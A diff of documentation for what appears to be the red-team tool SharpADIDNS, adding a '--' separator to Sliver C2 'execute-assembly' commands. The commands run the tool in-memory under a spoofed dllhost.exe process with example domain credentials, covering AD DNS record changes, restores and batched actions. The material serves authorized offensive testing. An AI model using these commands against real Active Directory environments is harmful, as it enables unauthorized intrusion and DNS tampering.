@@ -374,7 +374,7 @@ $ printf 'RedteamN0t3s.' | base64
 UmVkdGVhbU4wdDNzLg==
 
 # in Sliver console:
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
     --c2 \
     --username 'redteamnotes\redpen' \
     --password-base64 UmVkdGVhbU4wdDNzLg== \
@@ -421,7 +421,7 @@ Receipt schema:
 
 ```bash
 # from the receipt's previous_state.records_base64, restore each one
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
     --c2 \
     --username 'redteamnotes\redpen' \
     --password-base64 UmVkdGVhbU4wdDNzLg== \
@@ -463,7 +463,7 @@ This is a Sliver-side knob (`execute-assembly -p <process.exe>`), not a SharpADI
 A single `execute-assembly` invocation runs multiple actions. Statements are `;`-separated; each statement is a regular action verb with its own flags, applied on top of the outer flags (which become defaults).
 
 ```bash
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
     --c2 \
     --username 'redteamnotes\redpen' \
     --password-base64 UmVkdGVhbU4wdDNzLg== \
